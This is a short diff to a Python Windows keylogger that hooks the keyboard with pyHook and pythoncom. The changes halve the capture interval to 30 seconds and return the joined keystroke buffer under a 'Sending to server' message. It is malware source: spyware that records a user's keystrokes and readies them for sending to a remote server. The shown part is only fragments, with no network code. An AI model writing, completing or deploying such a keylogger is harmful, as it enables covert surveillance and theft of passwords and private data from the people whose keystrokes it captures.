@@ -5,6 +5,7 @@ import pythoncom
 import pyHook
 import win32clipboard
 import time
+import string
 
 user32 = windll.user32
 kernel32 = windll.kernel32
@@ -89,9 +90,9 @@ def run():
     #register the hook and execute forever
     k1.HookKeyboard()
     while True:
-        if time.clock()-start_time >60:
+        if time.clock()-start_time >30:
             print"Sending to server"                
-            return key_buffer   
+            return ''.join(key_logger)   
         pythoncom.PumpWaitingMessages()
     
     #return key_buffer
